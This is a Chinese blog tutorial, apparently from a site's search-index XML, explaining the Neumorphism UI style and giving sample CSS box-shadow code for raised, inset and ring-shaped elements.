        <content type="html"><![CDATA[<p>什么是新拟态(Neumorphism) UI 风格？网上似乎还没有一个准确统一的定义。按照我个人的通俗理解，就是将界面的一部分凸起来，另一部分凹下去，形成的一种错落有致的拟物风格。代表作是乌克兰设计师 Alexander Plyuto 在各平台发布的新作品「Skeuomorph Mobile Banking」<br><img src="https://luozhinet.com/postfile/2021/03/1588615345.png" alt="Skeuomorph Mobile Banking"></p><h3 id="新拟态-UI-风格与扁平、投影风格的对比"><a href="#新拟态-UI-风格与扁平、投影风格的对比" class="headerlink" title="新拟态 UI 风格与扁平、投影风格的对比"></a>新拟态 UI 风格与扁平、投影风格的对比</h3><p>从上面这张对比图可以看出，扁平风格就像是一张纸贴在墙面上，投影风格像是浮在半空中，而新拟态风格则像是墙面上直接凸起了一块。<br><img src="https://luozhinet.com/postfile/2021/03/333092447.jpg" alt="1"></p><h3 id="新拟态-UI-实现的方式"><a href="#新拟态-UI-实现的方式" class="headerlink" title="新拟态 UI 实现的方式"></a>新拟态 UI 实现的方式</h3><p>要实现这种风格，精髓在于一个白色的阴影+一个常规阴影。一个示例如下图所示：<br><img src="https://luozhinet.com/postfile/2021/03/3679197349.jpg" alt="16-39-31-031.jpg"></p><h3 id="新拟态-UI-风格的前端实现"><a href="#新拟态-UI-风格的前端实现" class="headerlink" title="新拟态 UI 风格的前端实现"></a>新拟态 UI 风格的前端实现</h3><p>线工具直接生成这种风格的 CSS 代码，很强！Neumorphism CSS 在线生成器地址：<a href="https://neumorphism.io/">https://neumorphism.io</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#ecf0f3</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-left</span>: <span class="number">80px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-top</span>: <span class="number">80px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#ecf0f3</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.drop-shadow</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-shadow</span>: <span class="number">18px</span> <span class="number">18px</span> <span class="number">30px</span> <span class="number">#d1d9e6</span>, -<span class="number">18px</span> -<span class="number">18px</span> <span class="number">30px</span> <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.inner-shadow</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-shadow</span>: inset <span class="number">18px</span> <span class="number">18px</span> <span class="number">30px</span> <span class="number">#d1d9e6</span>, inset -<span class="number">18px</span> -<span class="number">18px</span> <span class="number">30px</span> <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.inner-shadow-ring</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-shadow</span>: inset <span class="number">9px</span> <span class="number">9px</span> <span class="number">15px</span> <span class="number">#d1d9e6</span>, inset -<span class="number">9px</span> -<span class="number">9px</span> <span class="number">15px</span> <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.inner-shadow-ring</span><span class="selector-pseudo">:before</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">left</span>: <span class="number">20%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">top</span>: <span class="number">20%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">60%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">60%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#ecf0f3</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-shadow</span>: <span class="number">9px</span> <span class="number">9px</span> <span class="number">15px</span> <span class="number">#d1d9e6</span>, -<span class="number">9px</span> -<span class="number">9px</span> <span class="number">15px</span> <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;drop-shadow&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner-shadow&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner-shadow-ring&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 拟物 </tag>
            
            <tag> 拟态 </tag>
            
            <tag> plyuto </tag>
            
            <tag> skeuomorph </tag>
            
            <tag> alexander </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
